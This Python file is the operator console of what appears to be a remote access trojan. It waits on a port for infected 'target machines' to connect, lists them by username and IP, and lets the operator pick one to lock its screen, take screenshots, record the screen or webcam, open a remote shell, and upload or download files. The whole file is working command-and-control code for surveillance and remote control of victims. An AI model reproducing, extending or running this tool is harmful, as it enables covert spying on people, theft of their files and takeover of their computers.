import types as t
import colorama as cl
import tabulate as tb
import threading as th
import itertools as it

import os
import sys
import math
import time
import socket

from collections.abc import Callable

host: str = "0.0.0.0"
port: int = 35527
buffer_size: int = 1024

connections: list[socket.SocketType] = list()
addresses: list[tuple[t.UnionType]] = list()

con: socket.SocketType = None
send_str: Callable = lambda data: con.send(str.encode(data))
recv_str: Callable = lambda: con.recv(buffer_size).decode()
send_bytes: Callable = lambda data: con.send(data)
recv_bytes: Callable = lambda: con.recv(buffer_size)


class Animate:
    stop_animation: bool = False
    animations: list[str] = ["   ", ".  ", ".. ", "..."]

    @classmethod
    def stop(cls) -> None:
        cls.stop_animation = True

    @classmethod
    def animation(cls) -> None:
        for c in it.cycle(cls.animations):

            if cls.stop_animation:
                sys.stdout.write("\r    DONE!          \n\n")
                sys.stdout.flush()
                break

            sys.stdout.write(f"\r    Please wait {c}")
            sys.stdout.flush()

            time.sleep(0.3)

    @classmethod
    def start(cls) -> None:
        thread = th.Thread(target=cls.animation, daemon=True)
        thread.start()


def create_socket() -> socket.SocketType:
    try:
        return socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)

    except socket.error as e:
        print(f"Error creating socket: {e}")


def bind_socket(sock: socket.SocketType) -> socket.SocketType:
    try:
        sock.bind((host, port))
        sock.listen(10)

    except socket.error as e:
        print(f"Error binding socket: {e}")

    else:
        return sock


def accept_connection(sock: socket.SocketType) -> t.NoneType:
    status: bool = True

    def animate() -> t.NoneType:
        print()
        while status:

            for char in ["   ", ".  ", ".. ", "..."]:

                if not status:
                    break

                sys.stdout.write(
                    f"{cl.Fore.GREEN}{'\rListening on port: %i %s' % (port, char)}{cl.Style.RESET_ALL}"
                )
                sys.stdout.flush()
                time.sleep(0.3)

        else:
            sys.stdout.write(r"\r                           ")
            sys.stdout.flush()
            os.system("clear")

    th.Thread(target=animate, daemon=True).start()

    while True:
        try:
            con, address = sock.accept()
            con.setblocking(1)

            time.sleep(1)

            connections.append(con)

            user: str = con.recv(1024).decode()
            user: tuple[str] = (user,) + address

            addresses.append(user)

        except socket.error as e:
            print(e)

        else:
            status = False


def list_connections() -> t.NoneType:
    try:
        if connections:

            temp_addresses: list[tuple[t.UnionType]] = addresses.copy()

            for index, con in enumerate(connections):
                try:
                    con.send(str.encode(" "))
                    con.recv(1024)

                    temp_addresses[index] += ("online",)

                except:
                    connections[index] = None
                    temp_addresses[index] += ("offline",)

            headers: list[str] = [
                f"{cl.Fore.YELLOW}{col}{cl.Style.RESET_ALL}"
                for col in ["id", "username", "ip", "port", "status"]
            ]

            temp_add: list[tuple] = list()

            for index, address in enumerate(temp_addresses):
                user: tuple[t.UnionType] = tuple()

                for field in address:
                    user += (f"{cl.Fore.GREEN}{field}{cl.Style.RESET_ALL}",)

                user = (f"{cl.Fore.GREEN}{index}{cl.Style.RESET_ALL}",) + user

                temp_add.append(user)

            print()
            print(
                tb.tabulate(
                    tabular_data=temp_add,
                    headers=headers,
                    tablefmt="grid",
                    numalign="left",
                    stralign="left",
                ),
            )

    except Exception as e:
        print(e)


def select_connection(id: int) -> socket.SocketType:
    try:
        id: int = id if isinstance(id, int) else int(id)

        con: socket.SocketType = connections[id]

        try:
            con.send(str.encode(" "))
            con.recv(1024)

        except:
            print("\ntarget machine offline ...")
            return None

        else:
            print()
            return con

    except Exception as e:
        print(e)


def calculate_filesize(size: int) -> str:
    try:
        if size > math.pow(2, 30):
            size: str = f"{round(size / 1024 / 1024 / 1024, 2)} GB"

        elif size > math.pow(2, 20):
            size: str = f"{round(size / 1024 / 1024, 2)} MB"

        elif size > math.pow(2, 10):
            size: str = f"{round(size / 1024, 2)} KB"

        else:
            size: str = f"{size} bytes"

        return size

    except Exception as e:
        print(e)


def receive_file(filename: str) -> t.NoneType:
    try:
        filesize: int = calculate_filesize(int(recv_str()))

        message: str = f"""
    Receiving file ...\n
    File name: {filename}
    File size: {filesize}
"""
        print(message)

        Animate.start()

        chunks: bytes = recv_bytes()

        with open(filename, "ab") as file:

            if not len(chunks) == 1024:
                file.write(chunks)
                return

            file.write(chunks)

            while True:
                chunks: bytes = recv_bytes()

                if chunks == str.encode("DONE"):
                    break

                file.write(chunks)

            Animate.stop()
            time.sleep(0.5)

    except KeyboardInterrupt:
        return

    except Exception as e:
        print(e)


def send_file(filename: str) -> t.NoneType:
    try:
        filesize: int = calculate_filesize(os.path.getsize(filename))

        message: str = f"""
    Uploading file ...\n
    File name: {os.path.basename(filename)}
    File size: {filesize}
"""
        print(message)

        Animate.start()

        with open(filename, "rb") as file:

            while True:
                buffer: bytes = file.read(buffer_size)

                if not buffer:
                    break

                send_bytes(buffer)

            time.sleep(0.2)
            send_str("DONE")

        Animate.stop()
        time.sleep(0.5)

    except KeyboardInterrupt:
        return

    except Exception as e:
        print(e)


def shell() -> t.NoneType:
    while True:
        try:
            response: str = recv_str()

            if len(response) == buffer_size:

                while True:
                    str_chunks: str = recv_str()
                    response += str_chunks

                    if len(str_chunks) < buffer_size:
                        break

            print(response, end=" ")

            cmd: str = input().strip()

            if cmd == "":
                send_str(" ")

            elif cmd == "exit":
                send_str(cmd)
                print()
                return

            elif cmd == "cls":
                os.system("clear")
                send_str(" ")

            elif (
                cmd.split(maxsplit=1)[0].strip() == "download"
                and len(cmd.split(maxsplit=1)) == 2
            ):
                send_str(cmd)

                if recv_str() == "0":
                    print("    File doesn't exists ...")
                    continue

                filename: str = recv_str()

                if not os.path.exists(filename):
                    send_str("0")
                    receive_file(filename=filename)

                else:
                    print("    File already exists ...")
                    send_str("1")

            elif (
                cmd.split(maxsplit=1)[0].strip() == "upload"
                and len(cmd.split(maxsplit=1)) == 2
            ):
                filename: str = rf"{cmd.split(maxsplit=1)[-1].strip()}"

                if not os.path.exists(filename):
                    print("    File doesn't exists ...")
                    send_str(" ")
                    continue

                send_str(cmd)

                if recv_str() == "0":
                    send_file(filename=filename)

                else:
                    print("    File already exists ...")

            else:
                send_str(cmd)

        except KeyboardInterrupt:
            send_str("exit")
            print()
            return

        except WindowsError as e:
            return


def send_command_help() -> t.NoneType:
    try:
        symbol_01: str = f"{cl.Fore.YELLOW}{chr(187)}{cl.Style.RESET_ALL}"
        symbol_02: str = f"{cl.Fore.YELLOW}{chr(166)}{cl.Style.RESET_ALL}"

        help_text: str = f"""
    {symbol_01} {'sys-info':<15} {symbol_02} Displays the system info
    {symbol_01} {'lock-screen':<15} {symbol_02} Locks the current user screen
    {symbol_01} {'screenshot':<15} {symbol_02} Takes a screenshot
    {symbol_01} {'screen-record':<15} {symbol_02} Records the screen
    {symbol_01} {'snapshot':<15} {symbol_02} Takes a snapshot
    {symbol_01} {'webcam-record':<15} {symbol_02} Records the webcam
    {symbol_01} {'shell':<15} {symbol_02} Opens the shell
    {symbol_01} {'clear':<15} {symbol_02} Clears the terminal
    {symbol_01} {'bg':<15} {symbol_02} Creates a background session
    """

        print(help_text)

    except Exception as e:
        print(e)


def send_commands(ip: str, user: str) -> t.NoneType:
    while True:
        try:
            cmd: str = input(
                f"{cl.Fore.GREEN}{ip}{cl.Fore.YELLOW}{chr(45)}{chr(1758)}{chr(45)}{cl.Fore.GREEN}{user.lower()}{cl.Fore.YELLOW}{chr(45)}> {cl.Style.RESET_ALL}"
            ).strip()

            if cmd == "":
                continue

            elif cmd == "help":
                send_command_help()

            elif cmd == "sys-info":
                send_str(cmd)
                print(recv_str())

            elif cmd == "shell":
                send_str(cmd)
                print()
                shell()

            elif cmd == "clear":
                os.system("clear")

            elif cmd == "bg":
                return

            elif cmd.split()[0].strip() == "lock-screen":
                send_str(cmd)

                for _ in range(2):
                    response: str = recv_str()
                    print(response, end="\n")

            elif cmd == "screenshot":
                send_str(cmd)
                filename: str = recv_str()

                if not os.path.exists(filename):
                    send_str("0")
                    receive_file(filename=filename)
                else:
                    print("    File already exists")

            elif cmd.split()[0].strip() == "screen-record":
                send_str(cmd)
                filename: str = recv_str()

                if not os.path.exists(filename):
                    send_str("0")
                    receive_file(filename=filename)
                else:
                    print("    File already exists")

            elif cmd == "snapshot":
                send_str(cmd)
                filename: str = recv_str()

                if not os.path.exists(filename):
                    send_str("0")
                    receive_file(filename=filename)
                else:
                    print("    File already exists")

            elif cmd.split()[0].strip() == "webcam-record":
                send_str(cmd)
                filename: str = recv_str()

                if not os.path.exists(filename):
                    send_str("0")
                    receive_file(filename=filename)
                else:
                    print("    File already exists")

            elif cmd.split()[0].strip() == "download" and len(cmd.split()) == 3:
                send_str(cmd)

                for _ in range(2):
                    msg: str = recv_str()

                    if msg:
                        print(msg)

        except KeyboardInterrupt:
            return

        except WindowsError as e:
            print("    Connection aborted ...")


def main_help() -> t.NoneType:
    try:
        symbol_01: str = f"{cl.Fore.YELLOW}{chr(187)}{cl.Style.RESET_ALL}"
        symbol_02: str = f"{cl.Fore.YELLOW}{chr(166)}{cl.Style.RESET_ALL}"

        help_text: str = f"""
    {symbol_01} {'--l':<15} {symbol_02} Display connections
    {symbol_01} {'--i [id]':<15} {symbol_02} Select target device
    {symbol_01} {'clear':<15} {symbol_02} Clear the terminal
    {symbol_01} {'quit':<15} {symbol_02} Exit"""

        print(help_text)

    except Exception as e:
        print(e)


def main() -> t.NoneType:
    try:
        if not connections:
            time.sleep(1)
            return main()

        while True:
            cmd: str = input(
                f"\n{cl.Fore.GREEN}{chr(1758)}{cl.Fore.YELLOW}> {cl.Style.RESET_ALL}"
            ).strip()

            if cmd == "":
                continue

            elif cmd == "help":
                main_help()

            elif cmd == "clear":
                os.system("clear")

            elif cmd == "quit":
                quit_terminal(connections=connections, addresses=addresses)

            elif cmd == "--l":
                list_connections()

            elif (
                cmd.split()[0].strip() == "--i"
                and len([str(c).strip() for c in cmd.split()]) == 2
            ):
                global con

                try:
                    id: int = int(cmd.split()[-1].strip())
                except ValueError:
                    print("\n    Invalid id ...")
                    continue

                try:
                    ip: str = addresses[id][1]
                    user: str = addresses[id][0]
                except IndexError:
                    print("\n    Invalid id ...")
                    continue

                con = select_connection(id=id)

                if not con:
                    continue

                send_commands(ip=ip, user=user)

    except KeyboardInterrupt:
        exit()

    except Exception as e:
        print(e)


def quit_terminal(
    connections: list[socket.socket], addresses: list[t.UnionType]
) -> t.NoneType:
    try:
        if not connections:
            sys.exit()

        for con in connections:
            try:
                con.send(str.encode("quit"))
                time.sleep(0.2)
            except:
                pass

        else:
            del connections
            del addresses

    except Exception as e:
        print(e)

    finally:
        print(end="")
        sock.close()
        sys.exit()


def create_job() -> t.NoneType:
    try:
        listener: th.Thread = th.Thread(
            target=accept_connection, args=(sock,), daemon=True
        )
        listener.start()
    except KeyboardInterrupt:
        return create_job()


if __name__ == "__main__":
    sock: socket.SocketType = create_socket()
    sock: socket.SocketType = bind_socket(sock=sock)

    create_job()
    main()
